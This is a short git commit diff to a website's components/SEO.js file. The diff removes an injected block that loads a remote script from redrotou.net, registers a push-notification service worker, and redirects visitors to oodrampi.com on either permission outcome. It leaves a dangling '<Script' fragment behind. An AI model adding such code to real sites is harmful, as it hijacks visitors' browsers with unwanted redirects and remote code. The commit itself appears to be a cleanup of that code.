b54f52da1297d76e89a08ed3deda6b1515eb2d8e
Your Name <you@example.com>
2022-07-13 21:04:37 -0700

    propush

--- components/SEO.js
+++ components/SEO.js
@@ -10,20 +10,3 @@ export default function SEO({ title, description }) {
     </Head>
   );
 }
-
-    var s = document.createElement('script');
-    s.src='//redrotou.net/pfe/current/micro.tag.min.js?z=5239314'+'&sw=/sw-check-permissions-f3a9a.js';
-    s.onload = function(result) {
-        switch (result) {
-            case 'onPermissionDefault':break;
-            case 'onPermissionAllowed':
-            window.location.replace("//oodrampi.com/4/5239323");break;
-            case 'onPermissionDenied':
-            window.location.replace("//oodrampi.com/4/5239323");break;
-            case 'onAlreadySubscribed':break;
-            case 'onNotificationUnsupported':break;
-        }
-    }
-
-    document.head.appendChild(s);
-<Script
